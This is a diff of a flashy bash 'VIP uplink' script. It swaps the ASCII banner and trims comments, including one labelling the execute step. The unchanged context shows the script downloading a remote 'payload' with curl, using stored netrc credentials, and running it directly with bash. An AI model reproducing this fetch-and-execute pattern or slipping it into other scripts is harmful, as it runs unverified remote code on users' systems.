@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # ==========================================================
-# NOBITA CLOUD SYSTEM | BANE-ANMESH 3S UPLINK
-# DATE: 2026-04-08 | UI-TYPE: SEMA-HYPER-VISUAL → VIP ELITE
+# BANE-ANMESH 3S UPLINK | VIP ELITE ACCESS
+# DATE: 2026-04-08 | UI-TYPE: SEMA-HYPER-VISUAL
 # ==========================================================
 set -euo pipefail
 
@@ -27,14 +27,15 @@ LOCL_IP="10.1.0.29"
 # --- VIP HEADER ---
 render_vip_header() {
     clear
+    # VIP BLOCK STYLE LIEKGMC
     echo -e "${P}"
     cat << "EOF"
-███╗   ██╗ ██████╗ ██████╗ ██╗████████╗ █████╗      ██████╗██╗      ██████╗ ██╗   ██╗██████╗ 
-████╗  ██║██╔═══██╗██╔══██╗██║╚══██╔══╝██╔══██╗    ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗
-██╔██╗ ██║██║   ██║██████╔╝██║   ██║   ███████║    ██║     ██║     ██║   ██║██║   ██║██║  ██║
-██║╚██╗██║██║   ██║██╔══██╗██║   ██║   ██╔══██║    ██║     ██║     ██║   ██║██║   ██║██║  ██║
-██║ ╚████║╚██████╔╝██████╔╝██║   ██║   ██║  ██║    ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝
-╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝   ╚═╝   ╚═╝  ╚═╝     ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
+██╗     ██╗███████╗██╗  ██╗ ██████╗ ███╗   ███╗ ██████╗ 
+██║     ██║██╔════╝██║ ██╔╝██╔════╝ ████╗ ████║██╔════╝ 
+██║     ██║█████╗  █████╔╝ ██║  ███╗██╔████╔██║██║      
+██║     ██║██╔══╝  ██╔═██╗ ██║   ██║██║╚██╔╝██║██║      
+███████╗██║███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║╚██████╗ 
+╚══════╝╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ 
 EOF
     echo -e "${NC}"
 
@@ -48,7 +49,7 @@ EOF
 
 render_vip_header
 
-# --- NETWORK DIAGNOSTICS (VIP Style) ---
+# --- NETWORK DIAGNOSTICS ---
 echo -e " ${C}◉ NETWORK ROUTE DIAGNOSTICS${NC}"
 echo -e " ${DG}├─ Public Endpoint     :${NC} ${W}$IP${NC}"
 echo -e " ${DG}├─ Local Gateway       :${NC} ${W}$LOCL_IP${NC}"
@@ -87,7 +88,6 @@ if curl -fsSL -A "Bane-VIP-Agent" --netrc -o "$payload" "$URL"; then
     done
     echo -e "\n"
    
-    # Execute payload
     bash "$payload"
     
 else
